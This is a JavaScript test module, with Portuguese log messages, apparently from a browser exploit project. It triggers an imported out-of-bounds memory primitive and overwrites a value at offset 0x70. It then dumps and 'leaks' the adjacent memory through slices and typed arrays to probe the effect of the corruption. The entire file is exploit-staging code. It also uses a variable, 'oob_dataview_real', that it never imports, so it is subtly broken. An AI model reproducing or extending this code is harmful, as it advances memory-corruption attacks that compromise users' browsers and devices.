// js/script3/testCorruptAndReadZone.mjs
import { logS3, PAUSE_S3, SHORT_PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

async function readAndLogMemoryRegion(regionName, startOffset, endOffset) {
    logS3(`Memória em oob_array_buffer_real (${regionName}) (offsets ${toHex(startOffset)}-${toHex(endOffset)}):`, "info", "readAndLogMemoryRegion");
    if (!oob_array_buffer_real) {
        logS3("   oob_array_buffer_real não está definido!", "error", "readAndLogMemoryRegion");
        return;
    }
    let memorySnapshot = "";
    for (let i = startOffset; i < Math.min(endOffset, oob_array_buffer_real.byteLength); i += 4) {
        if (i % 16 === 0 && i > startOffset) memorySnapshot += "\n";
        if (i % 16 === 0) memorySnapshot += `${toHex(i, 8)}: `;
        try {
            let val = oob_read_absolute(i, 4);
            memorySnapshot += `${toHex(val, 32)} `;
        } catch (e) {
            memorySnapshot += "ERR_READ ";
            logS3(`Erro ao ler offset ${toHex(i)} (${regionName}): ${e.message}`, "warn", "readAndLogMemoryRegion");
        }
    }
    logS3(memorySnapshot || "   Região vazia ou fora dos limites.", "info", "readAndLogMemoryRegion");
    await PAUSE_S3(SHORT_PAUSE_S3);
}

export async function executeCorruptAndReadZoneTest() {
    const FNAME_TEST = "executeCorruptAndReadZoneTest";
    const corruptionOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const valueToWrite = 0xFFFFFFFF;
    const bytesToWrite = 4;

    logS3(`--- Iniciando Teste de Corrupção em ${toHex(corruptionOffset)} e Leitura da Zona Adjacente ---`, "test", FNAME_TEST);
    document.title = `CorruptReadZone @${toHex(corruptionOffset)}`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO OOB Setup";
        return;
    }
    logS3(`oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);

    // 1. Leitura Detalhada ANTES da Corrupção
    const zoneStart = 0x50; // Começar um pouco antes de 0x70
    const zoneEnd = 0x90;   // Ir um pouco depois de 0x70
    await readAndLogMemoryRegion("ANTES Corrupção", zoneStart, zoneEnd);

    // 2. Escrita OOB
    logS3(`CORRUPÇÃO OOB: Escrevendo ${toHex(valueToWrite)} @ ${toHex(corruptionOffset)} (${bytesToWrite} bytes)`, "warn", FNAME_TEST);
    try {
        oob_write_absolute(corruptionOffset, valueToWrite, bytesToWrite);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`ERRO CRÍTICO durante a escrita OOB: ${e_write.message}`, "error", FNAME_TEST);
        document.title = `ERRO OOB Write @${toHex(corruptionOffset)}`;
        clearOOBEnvironment();
        return;
    }
    document.title = `OOB Write Done @${toHex(corruptionOffset)}`;
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 3. Leitura Detalhada APÓS da Corrupção
    await readAndLogMemoryRegion("APÓS Corrupção", zoneStart, zoneEnd);

    // 4. Tentar fatiar e usar Uint32Array na zona corrompida
    logS3("Tentando fatiar e ler a zona corrompida com Uint32Array...", "test", FNAME_TEST);
    document.title = `Slicing/U32A Zone @${toHex(corruptionOffset)}`;
    const sliceOffset = zoneStart; 
    const sliceLength = zoneEnd - zoneStart; // Tamanho da zona que lemos

    try {
        if (oob_array_buffer_real.byteLength >= sliceOffset + sliceLength) {
            logS3(`   Criando slice de oob_array_buffer_real: offset=${toHex(sliceOffset)}, length=${toHex(sliceLength)}`, "info", FNAME_TEST);
            let sub_array_slice = oob_array_buffer_real.slice(sliceOffset, sliceOffset + sliceLength);
            logS3(`   Slice criado. Tamanho do slice: ${sub_array_slice.byteLength} bytes.`, "info", FNAME_TEST);
            
            let u32_view_on_slice = new Uint32Array(sub_array_slice);
            logS3(`   Conteúdo da fatia via Uint32Array (u32_view_on_slice.length: ${u32_view_on_slice.length}):`, "leak", FNAME_TEST);
            
            let line = "";
            for (let i = 0; i < u32_view_on_slice.length; i++) {
                if (i % 4 === 0 && i > 0) { line += "\n"; }
                if (i % 4 === 0) line += `${toHex(sliceOffset + i*4, 8)} (idx ${i}): `;
                line += `${toHex(u32_view_on_slice[i])} `;
            }
            if (line) logS3(line, "leak", FNAME_TEST);
            
            // Verificar se o valor escrito em 0x70 está correto na visão da fatia
            const relativeOffset70 = corruptionOffset - sliceOffset;
            if (relativeOffset70 >= 0 && (relativeOffset70 % 4 === 0) && (relativeOffset70 / 4) < u32_view_on_slice.length) {
                const idx70 = relativeOffset70 / 4;
                logS3(`   Valor em u32_view_on_slice[idx ${idx70}] (corresp. a ${toHex(corruptionOffset)}): ${toHex(u32_view_on_slice[idx70])}`, "info", FNAME_TEST);
                if (u32_view_on_slice[idx70] !== valueToWrite) {
                    logS3(`    !!! ALERTA: Valor em ${toHex(corruptionOffset)} na fatia (${toHex(u32_view_on_slice[idx70])}) diferente do escrito (${toHex(valueToWrite)}) !!!`, "error", FNAME_TEST);
                }
            } else {
                 logS3(`   Offset ${toHex(corruptionOffset)} não alinhado ou fora da fatia para verificação Uint32Array.`, "warn", FNAME_TEST);
            }

        } else {
            logS3(`   oob_array_buffer_real muito pequeno para a fatia planejada (offset=${toHex(sliceOffset)}, length=${toHex(sliceLength)})`, "warn", FNAME_TEST);
        }
    } catch (e_slice) {
        logS3(`ERRO ao tentar fatiar ou usar Uint32Array na zona corrompida: ${e_slice.name} - ${e_slice.message}`, "error", FNAME_TEST);
        document.title = `ERRO Slice/U32A Zone @${toHex(corruptionOffset)}`;
        console.error("Erro Slice/U32A:", e_slice);
    }

    // 5. Verificar oob_dataview_real original para sanidade
    logS3(`Verificando oob_dataview_real original pós-corrupção...`, "test", FNAME_TEST);
    try {
        if (oob_dataview_real && oob_dataview_real.buffer && oob_dataview_real.buffer.byteLength > 0) {
            let control_read = oob_dataview_real.getUint32(0, true); 
            logS3(`  Leitura de controle de oob_dataview_real[0] (abs offset ${toHex(OOB_CONFIG.BASE_OFFSET_IN_DV)}): ${toHex(control_read)}`, "good", FNAME_TEST);
        } else {
            logS3(`  oob_dataview_real NULO ou buffer inválido/zerado!`, "error", FNAME_TEST);
        }
    } catch (e_dv_orig) {
        logS3(`ERRO ao ler da oob_dataview_real original: ${e_dv_orig.name} - ${e_dv_orig.message}`, "error", FNAME_TEST);
    }

    logS3(`--- Teste de Corrupção em ${toHex(corruptionOffset)} e Leitura da Zona CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `CorruptReadZone Done @${toHex(corruptionOffset)}`;
    clearOOBEnvironment();
}
